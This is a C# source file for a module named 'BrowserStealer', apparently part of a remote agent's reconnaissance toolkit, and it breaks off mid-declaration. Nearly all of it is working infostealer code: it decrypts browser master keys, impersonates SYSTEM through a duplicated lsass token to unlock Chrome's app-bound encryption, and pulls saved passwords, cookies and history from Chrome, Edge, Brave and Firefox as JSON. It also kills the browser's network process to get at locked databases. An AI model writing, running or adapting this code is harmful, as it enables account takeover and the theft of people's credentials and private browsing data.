using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;

namespace LibraNextgen.Agent.Modules.Recon;

public static class BrowserStealer
{
    static BrowserStealer()
    {
        // NativeAOT: SQLitePCLRaw's reflection-based provider discovery doesn't work.
        // Explicitly set the e_sqlite3 provider bundled by Microsoft.Data.Sqlite.
        try { SQLitePCL.raw.SetProvider(new SQLitePCL.SQLite3Provider_e_sqlite3()); }
        catch { try { SQLitePCL.Batteries_V2.Init(); } catch { } }
    }

    public static string Collect(string type = "all", int offset = 0, int limit = 250)
    {
        try
        {
            var errors = new List<string>();
            var allItems = new List<string>();

            foreach (var (name, relPath) in ChromiumBrowsers)
            {
                var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                var userDataDir = Path.Combine(localAppData, relPath);
                if (!Directory.Exists(userDataDir)) continue;

                byte[]? v10Key = null, v20Key = null;
                bool hasAppBoundKey = false;
                try
                {
                    (v10Key, v20Key, hasAppBoundKey) = GetChromiumMasterKeys(Path.Combine(userDataDir, "Local State"));
                }
                catch (Exception ex) { errors.Add($"{name}: master key failed: {ex.Message}"); continue; }
                if (v10Key == null && v20Key == null) { errors.Add($"{name}: no usable master key (run as admin for v20)"); continue; }
                if (v20Key == null && hasAppBoundKey)
                    errors.Add($"{name}: v20 app-bound key unavailable (requires admin)");

                var profiles = new[] { "Default" }
                    .Concat(Directory.GetDirectories(userDataDir)
                        .Where(d => Path.GetFileName(d).StartsWith("Profile "))
                        .Select(Path.GetFileName)!)
                    .ToArray();

                foreach (var profile in profiles)
                {
                    var profileDir = Path.Combine(userDataDir, profile!);
                    if (!Directory.Exists(profileDir)) continue;
                    CollectType(type, name, profile!, profileDir, v10Key, v20Key, allItems, errors);
                }
            }

            // Firefox
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var ffProfilesDir = Path.Combine(appData, @"Mozilla\Firefox\Profiles");
            if (Directory.Exists(ffProfilesDir))
            {
                foreach (var profileDir in Directory.GetDirectories(ffProfilesDir))
                {
                    var profileName = Path.GetFileName(profileDir);
                    byte[]? masterKey = null;
                    try
                    {
                        var key4Path = Path.Combine(profileDir, "key4.db");
                        if (File.Exists(key4Path)) masterKey = GetFirefoxMasterKey(key4Path);
                    }
                    catch (Exception ex) { errors.Add($"Firefox/{profileName}: key4 failed: {ex.Message}"); }

                    CollectFirefoxType(type, profileName, profileDir, masterKey, allItems, errors);
                }
            }

            var total = allItems.Count;
            var paged = allItems.Skip(offset).Take(limit).ToList();
            var errPart = errors.Count > 0 ? $",\"errors\":[{string.Join(",", errors.Select(e => $"\"{Esc(e)}\""))}]" : "";
            return $$"""{"total":{{total}},"offset":{{offset}},"limit":{{limit}},"items":[{{string.Join(",", paged)}}]{{errPart}}}""";
        }
        catch (Exception ex)
        {
            return $$"""{"total":0,"offset":0,"limit":0,"items":[],"error":"{{Esc(ex.Message)}}"}""";
        }
    }

    private static void CollectType(string type, string browser, string profile, string profileDir, byte[]? v10Key, byte[]? v20Key, List<string> items, List<string> errors)
    {
        var ctx = $"{browser}/{profile}";
        switch (type)
        {
            case "passwords":
                foreach (var p in ReadChromiumPasswords(Path.Combine(profileDir, "Login Data"), v10Key, v20Key, errors, ctx))
                    items.Add($$"""{"browser":"{{Esc(browser)}}","profile":"{{Esc(profile)}}",{{p.AsSpan()[1..]}}}""");
                break;
            case "cookies":
                var cookiePath = Path.Combine(profileDir, "Network", "Cookies");
                if (!File.Exists(cookiePath)) cookiePath = Path.Combine(profileDir, "Cookies");
                foreach (var c in ReadChromiumCookies(cookiePath, v10Key, v20Key, errors, ctx))
                    items.Add($$"""{"browser":"{{Esc(browser)}}","profile":"{{Esc(profile)}}",{{c.AsSpan()[1..]}}}""");
                break;
            case "history":
                foreach (var h in ReadChromiumHistory(Path.Combine(profileDir, "History"), errors, ctx))
                    items.Add($$"""{"browser":"{{Esc(browser)}}","profile":"{{Esc(profile)}}",{{h.AsSpan()[1..]}}}""");
                break;
        }
    }

    private static void CollectFirefoxType(string type, string profile, string profileDir, byte[]? masterKey, List<string> items, List<string> errors)
    {
        switch (type)
        {
            case "passwords":
                if (masterKey != null)
                    foreach (var p in ReadFirefoxPasswords(profileDir, masterKey))
                        items.Add($$"""{"browser":"Firefox","profile":"{{Esc(profile)}}",{{p.AsSpan()[1..]}}}""");
                break;
            case "cookies":
                foreach (var c in ReadFirefoxCookies(Path.Combine(profileDir, "cookies.sqlite")))
                    items.Add($$"""{"browser":"Firefox","profile":"{{Esc(profile)}}",{{c.AsSpan()[1..]}}}""");
                break;
            case "history":
                foreach (var h in ReadFirefoxHistory(Path.Combine(profileDir, "places.sqlite")))
                    items.Add($$"""{"browser":"Firefox","profile":"{{Esc(profile)}}",{{h.AsSpan()[1..]}}}""");
                break;
        }
    }

    private static string Esc(string s)
    {
        var sb = new StringBuilder(s.Length);
        foreach (var c in s)
        {
            switch (c)
            {
                case '"': sb.Append("\\\""); break;
                case '\\': sb.Append("\\\\"); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                default:
                    if (c < 0x20) sb.Append($"\\u{(int)c:x4}");
                    else sb.Append(c);
                    break;
            }
        }
        return sb.ToString();
    }

    private static string FormatError(Exception ex)
    {
        var type = ex.GetType().Name;
        var msg = ex.Message;
        if (ex is TypeInitializationException tie && tie.InnerException != null)
            return $"{type}: {tie.InnerException.GetType().Name} - {tie.InnerException.Message}";
        if (ex.InnerException != null)
            return $"{type}: {msg} <- {ex.InnerException.GetType().Name}: {ex.InnerException.Message}";
        return $"{type}: {msg}";
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Chromium (Chrome / Edge / Brave)
    // ════════════════════════════════════════════════════════════════════════

    private static readonly (string Name, string RelPath)[] ChromiumBrowsers =
    {
        ("Chrome", @"Google\Chrome\User Data"),
        ("Edge", @"Microsoft\Edge\User Data"),
        ("Brave", @"BraveSoftware\Brave-Browser\User Data"),
    };

    private static (byte[]? v10Key, byte[]? v20Key, bool hasAppBoundKey) GetChromiumMasterKeys(string localStatePath)
    {
        if (!File.Exists(localStatePath)) return (null, null, false);
        var json = File.ReadAllText(localStatePath);
        using var doc = JsonDocument.Parse(json);
        if (!doc.RootElement.TryGetProperty("os_crypt", out var osCrypt)) return (null, null, false);

        // Standard v10 key (encrypted_key)
        byte[]? v10Key = null;
        if (osCrypt.TryGetProperty("encrypted_key", out var encKeyEl))
        {
            var encKeyB64 = encKeyEl.GetString();
            if (!string.IsNullOrEmpty(encKeyB64))
            {
                var encKey = Convert.FromBase64String(encKeyB64);
                var keyBytes = new byte[encKey.Length - 5]; // strip "DPAPI" prefix
                Buffer.BlockCopy(encKey, 5, keyBytes, 0, keyBytes.Length);
                v10Key = ProtectedData_Unprotect(keyBytes);
            }
        }

        // App-bound v20 key (app_bound_encrypted_key)
        byte[]? v20Key = null;
        bool hasAppBoundKey = osCrypt.TryGetProperty("app_bound_encrypted_key", out var appKeyEl);
        if (hasAppBoundKey)
        {
            var appKeyB64 = appKeyEl.GetString();
            if (!string.IsNullOrEmpty(appKeyB64))
            {
                try { v20Key = GetAppBoundMasterKey(appKeyB64); }
                catch { }
            }
        }

        return (v10Key, v20Key, hasAppBoundKey);
    }

    // ════════════════════════════════════════════════════════════════════════
    //  App-Bound (v20) Encryption — requires Admin / SeDebugPrivilege
    // ════════════════════════════════════════════════════════════════════════

    private static readonly byte[] AppBoundAesKey =
    {
        0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66, 0x51,
        0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28, 0x47, 0x87
    };
    private static readonly byte[] AppBoundChaChaKey =
    {
        0xE9, 0x8F, 0x37, 0xD7, 0xF4, 0xE1, 0xFA, 0x43, 0x3D, 0x19, 0x30, 0x4D, 0xC2, 0x25, 0x80, 0x42,
        0x09, 0x0E, 0x2D, 0x1D, 0x7E, 0xEA, 0x76, 0x70, 0xD4, 0x1F, 0x73, 0x8D, 0x08, 0x72, 0x96, 0x60
    };

    private static byte[]? GetAppBoundMasterKey(string base64Key)
    {
        var raw = Convert.FromBase64String(base64Key);
        // Strip "APPB" prefix (4 bytes)
        if (raw.Length < 5 || Encoding.ASCII.GetString(raw, 0, 4) != "APPB") return null;
        var encData = raw[4..];

        // Step 1: DPAPI decrypt as SYSTEM (requires LSASS token impersonation)
        var systemDecrypted = DpapiDecryptAsSystem(encData);
        if (systemDecrypted == null) return null;

        // Step 2: DPAPI decrypt as current user
        var userDecrypted = ProtectedData_Unprotect(systemDecrypted);
        if (userDecrypted == null) return null;

        // Step 3: Parse key blob and derive final key
        return ParseAppBoundKeyBlob(userDecrypted);
    }

    private static byte[]? DpapiDecryptAsSystem(byte[] data)
    {
        IntPtr lsassToken = IntPtr.Zero;
        try
        {
            // Find lsass.exe and duplicate its token
            var lsassProc = System.Diagnostics.Process.GetProcessesByName("lsass");
            if (lsassProc.Length == 0) return null;
            var lsassPid = lsassProc[0].Id;
            foreach (var p in lsassProc) p.Dispose();

            // Enable SeDebugPrivilege on current process
            EnableDebugPrivilege();

            var hProcess = OpenProcess(0x1000, false, (uint)lsassPid); // PROCESS_QUERY_LIMITED_INFORMATION
            if (hProcess == IntPtr.Zero) return null;

            try
            {
                if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out var hToken))
                    return null;

                try
                {
                    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero,
                        SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        TOKEN_TYPE.TokenPrimary, out lsassToken))
                        return null;
                }
                finally { CloseHandle(hToken); }
            }
            finally { CloseHandle(hProcess); }

            // Impersonate SYSTEM and call DPAPI
            if (!ImpersonateLoggedOnUser(lsassToken)) return null;
            try
            {
                return ProtectedData_Unprotect(data);
            }
            finally
            {
                RevertToSelf();
            }
        }
        catch { return null; }
        finally
        {
            if (lsassToken != IntPtr.Zero) CloseHandle(lsassToken);
        }
    }

    private static byte[]? ParseAppBoundKeyBlob(byte[] blob)
    {
        // Key blob structure:
        // [4 bytes header_len (LE)] [header] [4 bytes content_len (LE)] [content]
        // content = [1 byte flag] [12 bytes IV] [32 bytes ciphertext] [16 bytes tag]
        if (blob.Length < 8) return null;

        int headerLen = BitConverter.ToInt32(blob, 0);
        int contentOffset = 4 + headerLen;
        if (contentOffset + 4 > blob.Length) return null;

        int contentLen = BitConverter.ToInt32(blob, contentOffset);
        int dataStart = contentOffset + 4;
        if (dataStart + contentLen > blob.Length) return null;

        var content = blob[dataStart..(dataStart + contentLen)];

        // Edge: contentLen==32 means the key is already raw AES-256
        if (content.Length == 32) return content;

        if (content.Length < 1 + 12 + 32 + 16) return null;

        byte flag = content[0];
        var iv = content[1..13];
        var ciphertext = content[13..^16];
        var tag = content[^16..];

        return flag switch
        {
            1 => DecryptAppBoundFlag1(iv, ciphertext, tag),
            2 => DecryptAppBoundFlag2(iv, ciphertext, tag),
            _ => null // Flag 3 requires CNG NCrypt
        };
    }

    private static byte[]? DecryptAppBoundFlag1(byte[] iv, byte[] ciphertext, byte[] tag)
    {
        return AesGcmDecrypt(AppBoundAesKey, iv, ciphertext, tag);
    }

    private static byte[]? DecryptAppBoundFlag2(byte[] iv, byte[] ciphertext, byte[] tag)
    {
        try
        {
            var plaintext = new byte[ciphertext.Length];
            using var chacha = new ChaCha20Poly1305(AppBoundChaChaKey);
            chacha.Decrypt(iv, ciphertext, tag, plaintext);
            return plaintext;
        }
        catch (Exception) { return null; }
    }

    private static void EnableDebugPrivilege()
    {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out var hToken))
            return;
        try
        {
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out var luid)) return;
            var tp = new TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Luid = luid,
                Attributes = SE_PRIVILEGE_ENABLED
            };
            AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        }
        finally { CloseHandle(hToken); }
    }

    private static string DecryptChromiumValue(byte[] encrypted, byte[]? v10Key, byte[]? v20Key, bool isCookie = false)
    {
        if (encrypted.Length < 3) return "";

        // Detect version prefix
        if (encrypted[0] == (byte)'v' && encrypted[2] == (byte)'0')
        {
            bool isV20 = encrypted[1] == (byte)'2';
            bool isV10 = encrypted[1] == (byte)'1';

            if (isV20 || isV10)
            {
                var key = isV20 ? v20Key : v10Key;
                if (key == null) return "";

                var nonce = new byte[12];
                Buffer.BlockCopy(encrypted, 3, nonce, 0, 12);
                var cipherLen = encrypted.Length - 3 - 12 - 16;
                if (cipherLen <= 0) return "";
                var ciphertext = new byte[cipherLen];
                Buffer.BlockCopy(encrypted, 15, ciphertext, 0, cipherLen);
                var tag = new byte[16];
                Buffer.BlockCopy(encrypted, 15 + cipherLen, tag, 0, 16);

                var plaintext = AesGcmDecrypt(key, nonce, ciphertext, tag);
                if (plaintext == null) return "";

                // v20 cookies have 32 bytes of padding prefix to skip
                if (isV20 && isCookie && plaintext.Length > 32)
                    return Encoding.UTF8.GetString(plaintext, 32, plaintext.Length - 32);

                return Encoding.UTF8.GetString(plaintext);
            }
        }

        // Legacy DPAPI
        var decrypted = ProtectedData_Unprotect(encrypted);
        return decrypted != null ? Encoding.UTF8.GetString(decrypted) : "";
    }

    private static List<string> ReadChromiumPasswords(string dbPath, byte[]? v10Key, byte[]? v20Key, List<string> errors, string ctx)
    {
        var list = new List<string>();
        if (!File.Exists(dbPath)) { errors.Add($"{ctx}: Login Data not found"); return list; }

        var tmp = CopyDbToTemp(dbPath);
        if (tmp == null) { errors.Add($"{ctx}: cannot copy db"); return list; }
        try
        {
            using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
            conn.Open();
            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
            using var reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                try
                {
                    var url = reader.GetString(0);
                    var user = reader.GetString(1);
                    var encPass = (byte[])reader[2];
                    if (encPass.Length == 0) continue;
                    var pass = DecryptChromiumValue(encPass, v10Key, v20Key, isCookie: false);
                    if (!string.IsNullOrEmpty(user) || !string.IsNullOrEmpty(pass))
                        list.Add($$"""{"url":"{{Esc(url)}}","username":"{{Esc(user)}}","password":"{{Esc(pass)}}"}""");
                }
                catch { }
            }
        }
        catch (Exception ex) { errors.Add($"{ctx}/passwords: {FormatError(ex)}"); }
        finally { TryDeleteDb(tmp); }
        return list;
    }

    private static List<string> ReadChromiumCookies(string dbPath, byte[]? v10Key, byte[]? v20Key, List<string> errors, string ctx)
    {
        var list = new List<string>();
        if (!File.Exists(dbPath)) { errors.Add($"{ctx}: Cookies db not found"); return list; }

        var tmp = CopyDbToTemp(dbPath);
        if (tmp == null) { errors.Add($"{ctx}: cannot copy db"); return list; }
        try
        {
            using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
            conn.Open();
            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies";
            using var reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                try
                {
                    var host = reader.GetString(0);
                    var cname = reader.GetString(1);
                    var encVal = (byte[])reader[2];
                    var path = reader.GetString(3);
                    var expires = reader.GetInt64(4);
                    var value = encVal.Length > 0 ? DecryptChromiumValue(encVal, v10Key, v20Key, isCookie: true) : "";
                    list.Add($$"""{"host":"{{Esc(host)}}","name":"{{Esc(cname)}}","value":"{{Esc(value)}}","path":"{{Esc(path)}}","expires":{{expires}}}""");
                }
                catch { }
            }
        }
        catch (Exception ex) { errors.Add($"{ctx}/cookies: {FormatError(ex)}"); }
        finally { TryDeleteDb(tmp); }
        return list;
    }

    private static List<string> ReadChromiumHistory(string dbPath, List<string> errors, string ctx)
    {
        var list = new List<string>();
        if (!File.Exists(dbPath)) { errors.Add($"{ctx}: History not found"); return list; }

        var tmp = CopyDbToTemp(dbPath);
        if (tmp == null) { errors.Add($"{ctx}: cannot copy db"); return list; }
        try
        {
            using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
            conn.Open();
            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500";
            using var reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                var url = reader.GetString(0);
                var title = reader.GetString(1);
                var visits = reader.GetInt32(2);
                var lastVisit = reader.GetInt64(3);
                list.Add($$"""{"url":"{{Esc(url)}}","title":"{{Esc(title)}}","visits":{{visits}},"lastVisit":{{lastVisit}}}""");
            }
        }
        catch (Exception ex) { errors.Add($"{ctx}/history: {FormatError(ex)}"); }
        finally { TryDeleteDb(tmp); }
        return list;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Firefox
    // ════════════════════════════════════════════════════════════════════════

    private static byte[]? GetFirefoxMasterKey(string key4DbPath)
    {
        var tmp = CopyDbToTemp(key4DbPath);
        try
        {
            using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
            conn.Open();

            // Get global salt from metadata table
            byte[] globalSalt;
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = "SELECT item1 FROM metadata WHERE id = 'password'";
                var result = cmd.ExecuteScalar();
                if (result == null) return null;
                globalSalt = (byte[])result;
            }

            // Get encrypted private key from nssPrivate table (a11 column)
            byte[] a11;
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = "SELECT a11 FROM nssPrivate";
                var result = cmd.ExecuteScalar();
                if (result == null) return null;
                a11 = (byte[])result;
            }

            return DecryptNssKey(globalSalt, a11);
        }
        catch { return null; }
        finally { TryDeleteDb(tmp); }
    }

    private static byte[]? DecryptNssKey(byte[] globalSalt, byte[] a11)
    {
        // Parse ASN.1 structure of a11
        // Structure: SEQUENCE { SEQUENCE { OID, SEQUENCE { SEQUENCE { OID, OCTET_STRING(salt), INTEGER(iterations) }, SEQUENCE { OID, OCTET_STRING(IV) } } }, OCTET_STRING(ciphertext) }
        var parsed = ParseAsn1(a11);
        if (parsed == null) return null;

        var (salt, iv, iterations, ciphertext) = parsed.Value;

        // hashSalt = SHA1(globalSalt)
        var hashSalt = SHA1.HashData(globalSalt);

        // Derive key using PBKDF2-SHA256
        int keyLen = 32;
        using var pbkdf2 = new Rfc2898DeriveBytes(hashSalt, salt, iterations, HashAlgorithmName.SHA256);
        var derivedKey = pbkdf2.GetBytes(keyLen + iv.Length);
        var aesKey = derivedKey[..keyLen];

        // Decrypt with AES-CBC
        using var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.None;
        aes.Key = aesKey;
        aes.IV = iv;
        var decrypted = aes.CreateDecryptor().TransformFinalBlock(ciphertext, 0, ciphertext.Length);

        // Master key is first 24 bytes
        if (decrypted.Length < 24) return null;
        return decrypted[..24];
    }

    private static (byte[] salt, byte[] iv, int iterations, byte[] ciphertext)? ParseAsn1(byte[] data)
    {
        try
        {
            int pos = 0;
            // Outer SEQUENCE
            if (data[pos++] != 0x30) return null;
            ReadAsn1Length(data, ref pos);

            // Inner SEQUENCE (algorithm)
            if (data[pos++] != 0x30) return null;
            var algLen = ReadAsn1Length(data, ref pos);
            var algEnd = pos + algLen;

            // OID
            if (data[pos++] != 0x06) return null;
            var oidLen = ReadAsn1Length(data, ref pos);
            pos += oidLen;

            // SEQUENCE (params)
            if (data[pos++] != 0x30) return null;
            ReadAsn1Length(data, ref pos);

            // SEQUENCE (PBKDF2 params)
            if (data[pos++] != 0x30) return null;
            ReadAsn1Length(data, ref pos);

            // OID (PBKDF2)
            if (data[pos++] != 0x06) return null;
            var pbkdf2OidLen = ReadAsn1Length(data, ref pos);
            pos += pbkdf2OidLen;

            // SEQUENCE (PBKDF2 inner params)
            if (data[pos++] != 0x30) return null;
            ReadAsn1Length(data, ref pos);

            // OCTET STRING (salt)
            if (data[pos++] != 0x04) return null;
            var saltLen = ReadAsn1Length(data, ref pos);
            var salt = data[pos..(pos + saltLen)];
            pos += saltLen;

            // INTEGER (iterations)
            if (data[pos++] != 0x02) return null;
            var iterLen = ReadAsn1Length(data, ref pos);
            int iterations = 0;
            for (int i = 0; i < iterLen; i++)
                iterations = (iterations << 8) | data[pos + i];
            pos += iterLen;

            // Skip optional key length integer
            if (pos < algEnd && data[pos] == 0x02)
            {
                pos++;
                var kl = ReadAsn1Length(data, ref pos);
                pos += kl;
            }

            // Skip HMAC algorithm sequence if present
            if (pos < algEnd && data[pos] == 0x30)
            {
                pos++;
                var sl = ReadAsn1Length(data, ref pos);
                pos += sl;
            }

            // SEQUENCE (encryption scheme)
            if (data[pos++] != 0x30) return null;
            ReadAsn1Length(data, ref pos);

            // OID (AES-CBC)
            if (data[pos++] != 0x06) return null;
            var aesOidLen = ReadAsn1Length(data, ref pos);
            pos += aesOidLen;

            // OCTET STRING (IV)
            if (data[pos++] != 0x04) return null;
            var ivLen = ReadAsn1Length(data, ref pos);
            var iv = data[pos..(pos + ivLen)];
            pos += ivLen;

            // Skip to ciphertext at algEnd
            pos = algEnd;

            // OCTET STRING (ciphertext)
            if (data[pos++] != 0x04) return null;
            var ctLen = ReadAsn1Length(data, ref pos);
            var ciphertext = data[pos..(pos + ctLen)];

            return (salt, iv, iterations, ciphertext);
        }
        catch { return null; }
    }

    private static int ReadAsn1Length(byte[] data, ref int pos)
    {
        int b = data[pos++];
        if (b < 0x80) return b;
        int numBytes = b & 0x7F;
        int length = 0;
        for (int i = 0; i < numBytes; i++)
            length = (length << 8) | data[pos++];
        return length;
    }

    private static string DecryptFirefoxLogin(byte[] encrypted, byte[] masterKey)
    {
        // ASN.1: SEQUENCE { OCTET_STRING(keyId), AlgorithmIdentifier, OCTET_STRING(ciphertext) }
        try
        {
            int pos = 0;
            if (encrypted[pos++] != 0x30) return "";
            ReadAsn1Length(encrypted, ref pos);

            // OCTET STRING (key ID) - skip
            if (encrypted[pos++] != 0x04) return "";
            var kidLen = ReadAsn1Length(encrypted, ref pos);
            pos += kidLen;

            // SEQUENCE (algorithm)
            if (encrypted[pos++] != 0x30) return "";
            ReadAsn1Length(encrypted, ref pos);

            // OID
            if (encrypted[pos++] != 0x06) return "";
            var oidLen = ReadAsn1Length(encrypted, ref pos);
            var oid = encrypted[pos..(pos + oidLen)];
            pos += oidLen;

            // OCTET STRING (IV)
            if (encrypted[pos++] != 0x04) return "";
            var ivLen = ReadAsn1Length(encrypted, ref pos);
            var iv = encrypted[pos..(pos + ivLen)];
            pos += ivLen;

            // OCTET STRING (ciphertext)
            if (encrypted[pos++] != 0x04) return "";
            var ctLen = ReadAsn1Length(encrypted, ref pos);
            var ciphertext = encrypted[pos..(pos + ctLen)];

            // 3DES-CBC decryption (OID 1.2.840.113549.3.7 = DES-EDE3-CBC)
            using var tdes = TripleDES.Create();
            tdes.Mode = CipherMode.CBC;
            tdes.Padding = PaddingMode.None;
            tdes.Key = masterKey;
            tdes.IV = iv;
            var decrypted = tdes.CreateDecryptor().TransformFinalBlock(ciphertext, 0, ciphertext.Length);

            // Remove PKCS7 padding
            int padLen = decrypted[^1];
            if (padLen > 0 && padLen <= 8)
                decrypted = decrypted[..^padLen];

            return Encoding.UTF8.GetString(decrypted);
        }
        catch { return ""; }
    }

    private static List<string> ReadFirefoxPasswords(string profileDir, byte[] masterKey)
    {
        var list = new List<string>();
        var loginsPath = Path.Combine(profileDir, "logins.json");
        if (!File.Exists(loginsPath)) return list;

        try
        {
            var json = File.ReadAllText(loginsPath);
            using var doc = JsonDocument.Parse(json);
            if (!doc.RootElement.TryGetProperty("logins", out var logins)) return list;

            foreach (var login in logins.EnumerateArray())
            {
                var hostname = login.GetProperty("hostname").GetString() ?? "";
                var encUser = login.GetProperty("encryptedUsername").GetString() ?? "";
                var encPass = login.GetProperty("encryptedPassword").GetString() ?? "";

                var userBytes = Convert.FromBase64String(encUser);
                var passBytes = Convert.FromBase64String(encPass);
                var username = DecryptFirefoxLogin(userBytes, masterKey);
                var password = DecryptFirefoxLogin(passBytes, masterKey);

                if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(password))
                    list.Add($$"""{"url":"{{Esc(hostname)}}","username":"{{Esc(username)}}","password":"{{Esc(password)}}"}""");
            }
        }
        catch { }
        return list;
    }

    private static List<string> ReadFirefoxCookies(string dbPath)
    {
        var list = new List<string>();
        if (!File.Exists(dbPath)) return list;

        var tmp = CopyDbToTemp(dbPath);
        if (tmp == null) return list;
        try
        {
            using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
            conn.Open();
            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT host, name, value, path, expiry FROM moz_cookies";
            using var reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                var host = reader.GetString(0);
                var cname = reader.GetString(1);
                var value = reader.GetString(2);
                var path = reader.GetString(3);
                var expiry = reader.GetInt64(4);
                list.Add($$"""{"host":"{{Esc(host)}}","name":"{{Esc(cname)}}","value":"{{Esc(value)}}","path":"{{Esc(path)}}","expires":{{expiry}}}""");
            }
        }
        catch { }
        finally { TryDeleteDb(tmp); }
        return list;
    }

    private static List<string> ReadFirefoxHistory(string dbPath)
    {
        var list = new List<string>();
        if (!File.Exists(dbPath)) return list;

        var tmp = CopyDbToTemp(dbPath);
        if (tmp == null) return list;
        try
        {
            using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
            conn.Open();
            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE visit_count > 0 ORDER BY last_visit_date DESC LIMIT 500";
            using var reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                var url = reader.GetString(0);
                var title = reader.IsDBNull(1) ? "" : reader.GetString(1);
                var visits = reader.GetInt32(2);
                var lastVisit = reader.IsDBNull(3) ? 0L : reader.GetInt64(3);
                list.Add($$"""{"url":"{{Esc(url)}}","title":"{{Esc(title)}}","visits":{{visits}},"lastVisit":{{lastVisit}}}""");
            }
        }
        catch { }
        finally { TryDeleteDb(tmp); }
        return list;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Utilities
    // ════════════════════════════════════════════════════════════════════════

    private static string? CopyDbToTemp(string path)
    {
        var tmp = Path.Combine(Path.GetTempPath(), $"lb_{Guid.NewGuid():N}.db");

        // Try force-copy with shared read first
        try
        {
            ForceCopyFile(path, tmp);
            CopyWalShm(path, tmp);
            return tmp;
        }
        catch
        {
            try { File.Delete(tmp); } catch { }
        }

        // Fallback: kill the browser network service process, then retry
        KillBrowserNetworkProcess(path);
        for (int i = 0; i < 50; i++)
        {
            try
            {
                ForceCopyFile(path, tmp);
                CopyWalShm(path, tmp);
                return tmp;
            }
            catch { Thread.Sleep(10); }
        }

        try { File.Delete(tmp); } catch { }
        return null;
    }

    private static void CopyWalShm(string srcDb, string dstDb)
    {
        var wal = srcDb + "-wal";
        if (File.Exists(wal)) try { ForceCopyFile(wal, dstDb + "-wal"); } catch { }
        var shm = srcDb + "-shm";
        if (File.Exists(shm)) try { ForceCopyFile(shm, dstDb + "-shm"); } catch { }
    }

    private static void KillBrowserNetworkProcess(string lockedFilePath)
    {
        // Determine which browser based on path
        string processName;
        if (lockedFilePath.Contains("Google\\Chrome", StringComparison.OrdinalIgnoreCase) ||
            lockedFilePath.Contains("Google/Chrome", StringComparison.OrdinalIgnoreCase))
            processName = "chrome";
        else if (lockedFilePath.Contains("BraveSoftware", StringComparison.OrdinalIgnoreCase))
            processName = "brave";
        else
            processName = "msedge";

        try
        {
            var processes = System.Diagnostics.Process.GetProcessesByName(processName);
            foreach (var proc in processes)
            {
                try
                {
                    var cmdLine = GetCommandLine(proc.Id);
                    if (cmdLine != null && cmdLine.Contains("--type=utility") &&
                        cmdLine.Contains("network.mojom.NetworkService"))
                    {
                        proc.Kill();
                        proc.WaitForExit(3000);
                        break;
                    }
                }
                catch { }
                finally { proc.Dispose(); }
            }
        }
        catch { }
    }

    private static string? GetCommandLine(int processId)
    {
        try
        {
            using var searcher = new System.Management.ManagementObjectSearcher(
                $"SELECT CommandLine FROM Win32_Process WHERE ProcessId = {processId}");
            foreach (var obj in searcher.Get())
            {
                return obj["CommandLine"]?.ToString();
            }
        }
        catch { }
        return null;
    }

    private static void ForceCopyFile(string src, string dst)
    {
        using var source = new FileStream(src, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
        using var dest = new FileStream(dst, FileMode.Create, FileAccess.Write, FileShare.None);
        source.CopyTo(dest);
    }

    private static void TryDeleteDb(string path)
    {
        try { File.Delete(path); } catch { }
        try { File.Delete(path + "-wal"); } catch { }
        try { File.Delete(path + "-shm"); } catch { }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  BCrypt P/Invoke (AES-GCM via Windows CNG, avoids AesGcm AOT issues)
    // ════════════════════════════════════════════════════════════════════════

    [DllImport("bcrypt.dll")]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
        [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
        [MarshalAs(UnmanagedType.LPWStr)] string? pszImplementation, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptSetProperty(IntPtr hObject,
        [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
